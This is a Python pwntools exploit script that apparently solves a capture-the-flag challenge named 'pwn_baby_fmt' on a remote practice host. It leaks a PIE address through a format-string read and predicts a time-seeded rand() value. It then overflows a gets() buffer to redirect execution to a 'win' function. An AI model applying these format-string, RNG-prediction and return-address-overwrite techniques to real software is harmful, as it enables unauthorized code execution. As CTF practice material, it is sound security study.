from pwn import *

from ctypes import CDLL
import time

elf = ELF('/home/kali/Downloads/pwn_baby_fmt')

cyberedu = '35.246.200.178:31262'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    gdb.attach(p, gdbscript = 'c')
    

libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")

now = int(time.time())

i=20
j=1

for seed in range(now - 10, now + 10):
    libc.srand(seed)
    random = libc.rand()
    print(seed, random)
    if i==j:
    	random_number = random
    
    j=j+1
    
print(f"random number for i={i} is {random_number}")
   
#local testing, run normally
#remote testing, run python3 exploit.py REMOTE

#17 - pie
# 09 - weird pie?looking
# 13-weird random looking
# 19 rando , 21 rando, 26, 27.

p.recvuntil(b'?\n')
p.sendline(b"%8$p")
p.recvline()

main = int(p.recvline().strip(), 16)
print(hex(main))

#17 is pie base + 0x148f

#remote - 8 is pie base + 0x1400
pie = main - 0x1400
win = pie + 0x133b
print(hex(win))

p.recvuntil(b'?\n')

#gets(v4)

v4 = b"A"*5
#the actual v4 buffer

v4 += p32(random_number)
#4 byte v5

v4 += b'\x90' * 20
#padding until rbp

v4 += b'\x90' * 8
#rbp, 8 bytes

v4 += p64(win)
#win finally

p.sendline(v4)



p.interactive()
